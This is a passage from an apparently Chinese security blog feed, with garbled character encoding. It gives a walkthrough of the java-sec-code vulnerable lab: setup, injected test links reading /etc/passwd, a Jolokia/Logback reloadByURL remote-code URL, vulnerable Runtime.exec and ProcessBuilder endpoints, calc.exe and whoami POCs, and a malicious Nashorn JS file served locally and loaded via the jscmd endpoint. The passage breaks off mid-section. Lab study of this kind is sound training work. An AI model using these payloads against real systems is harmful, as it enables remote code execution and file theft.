title="2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶"></a>2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶</h2><p>07-29 20:27:27 ERROR activate(smartbi.framework.Framework:85) - æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶<br>æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶:ReportCount:452&gt;20</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219949.png" alt="20250729211037212"></p><p><strong>è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºå®‰è£…æ—¶é€‰æ‹©äº†å®‰è£…<code>æ¼”ç¤ºæ•°æ®åº“</code> ï¼Œä¸å®‰è£…å³å¯ã€‚</strong></p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒæ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-sec-code é¶åœºé¢˜è§£</title>
    <link href="/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/"/>
    <url>/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="java-sec-code-é¶åœº"><a href="#java-sec-code-é¶åœº" class="headerlink" title="java-sec-code é¶åœº"></a>java-sec-code é¶åœº</h1><h1 id="ä¸€ã€é¶åœºç¯å¢ƒ"><a href="#ä¸€ã€é¶åœºç¯å¢ƒ" class="headerlink" title="ä¸€ã€é¶åœºç¯å¢ƒ"></a>ä¸€ã€é¶åœºç¯å¢ƒ</h1><p>æºç åœ°å€ï¼š</p><p><a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p><p>æ­å»ºç¯å¢ƒï¼š</p><p>IDEAï¼Œpache-maven-3.9.1ï¼Œapache-tomcat-9.0.105ï¼ŒJDK 1.8ï¼ŒMySQL 5.7.26ï¼Œ</p><p>â€‹æ•°æ®åº“ï¼šå°çš®é¢æ¿è‡ªå¸¦çš„MySQLï¼Œå¯¼å…¥sqlæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924734.png" alt="20250722121837762"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924866.png" alt="20250722121922614"></p><p>â€‹ä¿®æ”¹æ•°æ®åº“å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924471.png" alt="20250722121952382"></p><p>â€‹é»˜è®¤ç«¯å£ä¸º8080ï¼Œå¦‚æœè¢«å ç”¨ï¼Œåœ¨ application.properties ä¸­å†™å…¥ <code>server.port=8081</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925668.png" alt="20250722122032495"></p><p>ä¹‹åå¯åŠ¨ Maven install</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925205.png" alt="20250722122150263"></p><p>è¿è¡Œ Application.java</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926472.png" alt="20250722122307068"></p><p>è®¿é—® 127.0.0.1:8081</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926105.png" alt="20250722122339704"></p><p>æ­å»ºæˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926235.png" alt="20250722122412538"></p><p>ä»¥ä¸‹æ˜¯ä¸€äº›å°çš„æ”¹åŠ¨ï¼š</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><blockquote><p>å› ä¸ºé¡¹ç›®ä½œè€…é€‰æ‹©çš„å·¥ä½œç¯å¢ƒä¸ºlinuxæ“ä½œç³»ç»Ÿï¼Œè€Œæˆ‘æœ¬äººé€‰æ‹©çš„å·¥ä½œç¯å¢ƒä¸ºwindowsæ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥ä¸ºäº†éƒ¨åˆ†åŠŸèƒ½è¿è¡ŒæˆåŠŸéœ€è¦ä¿®æ”¹å‡ å¤„æºç ï¼Œé¦–å…ˆä¿®æ”¹CommandInject.javaæ–‡ä»¶ä¸‹çš„æºç ï¼Œå°†shæ‰§è¡Œå‘½ä»¤æ›¿æ¢ä¸ºcmdå‘½ä»¤ï¼Œè¿˜æœ‰ä¿®æ”¹æºç ä¸­ä¸€äº›å…¶å®ƒçš„linuxæ“ä½œç³»ç»Ÿä¸Šç‹¬æœ‰çš„å‘½ä»¤ã€‚</p></blockquote><ol><li>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926915.png" alt="20250722122752916"></p><ol start="2"><li>src&#x2F;main&#x2F;resources&#x2F;templates&#x2F;index.html</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/codeinject?filepath=/tmp;cat /etc/passwd&#125;&quot;&gt;CmdInject&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/codeinject?filepath=.%26ipconfig&#125;&quot;</span>&gt;</span>CmdInject<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>   <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/path_traversal/vul?filepath=../../../../../etc/passwd&#125;&quot;&gt;PathTraversal&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/path_traversal/vul?filepath=D:/test.txt&#125;&quot;</span>&gt;</span>PathTraversal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///etc/passwd&#125;&quot;&gt;SSRF&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///D:/test.txt&#125;&quot;</span>&gt;</span>SSRF<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926719.png" alt="20250722123350854"></p><h1 id="äºŒã€æ¼æ´å¤ç°"><a href="#äºŒã€æ¼æ´å¤ç°" class="headerlink" title="äºŒã€æ¼æ´å¤ç°"></a>äºŒã€æ¼æ´å¤ç°</h1><ul><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Actuators-to-RCE">Actuators to RCE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CORS">CORS</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CSRF">CSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Deserialize">Deserialize</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Fastjson">Fastjson</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI">Java RMI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JSONP">JSONP</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Poi-ooxml-XXE">POI-OOXML XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SQL-Inject">SQLI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSRF">SSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSTI">SSTI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass">URL whitelist Bypass</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE">XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JWT">JWT</a>  </li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/others">Others</a></li></ul><h3 id="Logback-xml"><a href="#Logback-xml" class="headerlink" title="Logback.xml"></a>Logback.xml</h3><p>src&#x2F;main&#x2F;resources&#x2F;logback-online.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>  <span class="hljs-comment">&lt;!-- logback é…ç½®æ–‡ä»¶æ ‡ç­¾ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!-- æ§åˆ¶å°è¾“å‡ºæ ‡ç­¾ --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">withJansi</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">withJansi</span>&gt;</span>  <span class="hljs-comment">&lt;!-- Jansi æ˜¯ä¸€ä¸ª Java åº“ï¼Œç”¨æ¥æ”¯æŒå½©è‰²æ—¥å¿—è¾“å‡º  --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>  <span class="hljs-comment">&lt;!-- è¾“å‡ºæ ¼å¼æ ‡ç­¾ --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>[%thread] %highlight(%-5level) %cyan(%logger&#123;15&#125;) - %msg %n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>  <span class="hljs-comment">&lt;!-- è¾“å‡ºæ ¼å¼ --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!-- æ ¹æ ‡ç­¾ --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- å¼•ç”¨æ§åˆ¶å°è¾“å‡ºæ ‡ç­¾ --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jmxConfigurator</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- æš´éœ² Logback çš„è¿è¡Œæ—¶é…ç½®èƒ½åŠ›ï¼ˆå¼€å¯ JMX ç®¡ç†åŠŸèƒ½ï¼‰  --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ¼æ´äº§ç”ŸåŸå› ï¼š</strong></p><p><code>   &lt;jmxConfigurator/&gt;</code></p><p>ä½œç”¨ï¼šæš´éœ² Logback çš„è¿è¡Œæ—¶é…ç½®èƒ½åŠ›ï¼ˆå¼€å¯ JMX ç®¡ç†åŠŸèƒ½ï¼‰</p><p>è¿™ä¸ªé…ç½®ä¼šæ³¨å†Œä¸€ä¸ª JMX MBean ï¼ˆå¯ä»¥è¿œç¨‹ç®¡ç†çš„ Java å¯¹è±¡ ï¼Œâ€œé¥æ§å™¨â€ï¼‰ï¼Œå®ƒå…è®¸ç”¨æˆ·é€šè¿‡ JMX æ§åˆ¶å°ã€Jolokia ï¼ˆJolokia æ˜¯ä¸€ä¸ªç”¨æ¥è®¿é—®è¿œç¨‹ JMX MBeans çš„æ–¹æ³•ï¼ŒJolokia é€šè¿‡ HTTP è®¿é—® JMXï¼‰ç­‰è¿œç¨‹ç®¡ç†å·¥å…·è°ƒç”¨ Logback çš„æ–¹æ³•</p><p>å¦‚æœç³»ç»Ÿéƒ¨ç½²ä¸­ æš´éœ²äº† Jolokia çš„ &#x2F;jolokia æ¥å£ï¼Œæ”»å‡»è€…å¯ä»¥è¿œç¨‹è°ƒç”¨ Logback çš„ reloadByURL æ–¹æ³•ï¼ŒåŠ è½½æ¶æ„é…ç½®æ–‡ä»¶ï¼Œè¿›è€Œå‘èµ· JNDI æ³¨å…¥ âœ è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8081</span><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp">/127.0.0.1:8888!/</span>xxx.xml<br></code></pre></td></tr></table></figure><ul><li><p><code>/jolokia/exec/</code>ï¼šJolokia çš„ exec è°ƒç”¨è·¯å¾„</p></li><li><p><code>ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator</code>ï¼šLogback ä¸­æ·»åŠ  <code>&lt;jmxConfigurator/&gt;</code> æ³¨å†Œ JMX MBean åçš„é»˜è®¤åç§°</p></li><li><p><code>/reloadByURL/</code>ï¼šè°ƒç”¨çš„ JMX æ–¹æ³•ï¼Œå³ <code>reloadByURL(URL configFile)</code>ï¼Œè¿è¡Œåé‡æ–°åŠ è½½ Logback é…ç½®æ–‡ä»¶</p></li><li><p><code>http:!/!/127.0.0.1:8888!/xxx.xml</code>ï¼šæ³¨æ„ <code>!/!/</code> æ˜¯ URL ç¼–ç ä¸­å¯¹ <code>/</code> å’Œ <code>:</code> çš„ç»•è¿‡æ‰‹æ³•ï¼Œæœ€åè§£ææˆï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:8888/xxx.xml</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="Rce-java"><a href="#Rce-java" class="headerlink" title="Rce.java"></a>Rce.java</h3><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Rce.java</p><h4 id="1-runtime-exec"><a href="#1-runtime-exec" class="headerlink" title="1.&#x2F;runtime&#x2F;exec"></a>1.&#x2F;runtime&#x2F;exec</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/runtime/exec&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">CommandExec</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//æ¥æ”¶ cmd å‚æ•°</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//è·å–å½“å‰ JVM çš„ RunTime å¯¹è±¡ï¼Œé€šè¿‡å®ƒå¯ä»¥è°ƒç”¨ exec å‘½ä»¤</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<span class="hljs-comment">//æ¥æ”¶è¾“å‡ºç»“æœ</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> run.exec(cmd);<span class="hljs-comment">//æ‰§è¡Œ cmd å‘½ä»¤</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br>            <span class="hljs-keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(tmpStr);<br>            &#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œäº§ç”Ÿäº†rce æ¼æ´</p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>POCï¼š&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;calc.exe</p><p>å¯ä»¥å¼¹å‡ºè®¡ç®—æœº</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927152.png" alt="20250722141657147"></p><p>POCï¼š&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;whoami</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927609.png" alt="20250722141728262"></p><h4 id="2-ProcessBuilder"><a href="#2-ProcessBuilder" class="headerlink" title="2.&#x2F;ProcessBuilder"></a>2.&#x2F;ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processBuilder</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//æ¥æ”¶è¾“å…¥çš„ cmd</span><br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] arrCmd = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<span class="hljs-comment">//å°† cmd ç›´æ¥æ‹¼æ¥åˆ° shell ç¯å¢ƒ</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(arrCmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> processBuilder.start();<span class="hljs-comment">//è§¦å‘å‘½ä»¤æ‰§è¡Œ</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸€æ¼æ´éœ€è¦åœ¨Linuxç¯å¢ƒä¸­å¤ç°</p><h4 id="3-jscmd"><a href="#3-jscmd" class="headerlink" title="3.&#x2F;jscmd"></a>3.&#x2F;jscmd</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/jscmd&quot;)</span>  <span class="hljs-comment">// å®šä¹‰GETè¯·æ±‚ç«¯ç‚¹</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jsEngine</span><span class="hljs-params">(String jsurl)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <span class="hljs-comment">// æ¥æ”¶jsurlå‚æ•°</span><br>    <span class="hljs-comment">// è·å–JavaScriptå¼•æ“ï¼ˆNashornï¼‰</span><br>    <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);    <br>    <span class="hljs-comment">// è·å–å½“å‰å¼•æ“çš„ä½œç”¨åŸŸç»‘å®š</span><br>    <span class="hljs-type">Bindings</span> <span class="hljs-variable">bindings</span> <span class="hljs-operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);    <br>    <span class="hljs-comment">// æ„é€ åŠ è½½è¿œç¨‹JSçš„å‘½ä»¤</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);    <br>    <span class="hljs-comment">// æ‰§è¡ŒåŠ è½½å‘½ä»¤</span><br>    engine.eval(cmd, bindings);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„<code>jsurl</code>æ„é€ <code>load()</code>å‘½ä»¤</li><li><strong>æ— ä»»ä½•å®‰å…¨è¿‡æ»¤</strong></li></ul><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>å› ä¸ºæ˜¯åŸºäºJavaçš„Nashorn JavaScriptå¼•æ“ï¼Œæ¥å—ä¸€ä¸ª<strong>å¤–éƒ¨JSæ–‡ä»¶URL</strong>ï¼ˆ<code>jsurl</code>ï¼‰ï¼Œç„¶åé€šè¿‡<code>load()</code>å‡½æ•°å»åŠ è½½æ‰§è¡Œè¿œç¨‹çš„JSä»£ç ï¼Œå¦‚æœè¿œç¨‹JSåŒ…å«æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚è°ƒç”¨Javaçš„<code>Runtime.exec</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼‰ï¼Œå°±ä¼šé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚</p><p>å…ˆç¼–å†™ä¸€ä¸ªæ¶æ„çš„JSæ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// zz.js</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-title function_">mainOutput</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mainOutput</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// Windowsæ‰“å¼€è®¡ç®—å™¨å‘½ä»¤</span><br>    <span class="hljs-keyword">var</span> cmd = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br>    <span class="hljs-comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Runtime</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmd);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927399.png" alt="20250722150342733"></p><p>æ”¾å…¥Cç›˜</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927712.png" alt="20250722150411441"></p><p>ç”¨Pythonè‡ªå¸¦çš„ç®€æ˜“HTTPæœåŠ¡å™¨å¿«é€Ÿå¯åŠ¨</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> C:\malicious<br>python -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927851.png" alt="20250722150542190"></p><p>ç°åœ¨æœ¬åœ°å°±æœ‰äº†ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œè¿œç¨‹JSè„šæœ¬çš„URLå°±æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8000/zz.js<br></code></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/rce/</span>jscmd?jsurl=http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8000</span>/zz.js<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927894.png" alt="20250722150709404"></p><p>HTTPè®¿é—®æ—¥å¿—ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928094.png" alt="20250722150740046"></p><h4 id="4-vuln-yarm"><a href="#4-vuln-yarm" class="headerlink" title="4.&#x2F;vuln&#x2F;yarm"></a>4.&#x2F;vuln&#x2F;yarm</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-comment">//ä½¿ç”¨é»˜è®¤æ„é€ æ–¹æ³•åˆ›å»ºä¸€ä¸ª SnakeYAML çš„è§£æå™¨ã€‚è¿™ä¸ªæ„é€ å™¨ä¼šä½¿ç”¨é»˜è®¤çš„ Constructorï¼Œå…è®¸åŠ è½½ Java å¯¹è±¡ï¼Œå­˜åœ¨å®‰å…¨é£é™©ã€‚</span><br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-comment">//è¿™é‡ŒæŠŠä¼ å…¥çš„ content ä½œä¸º YAML è¾“å…¥è¿›è¡Œè§£æï¼Œå¦‚æœå†…å®¹é‡Œæ„é€ äº†ç‰¹æ®Šçš„ Java 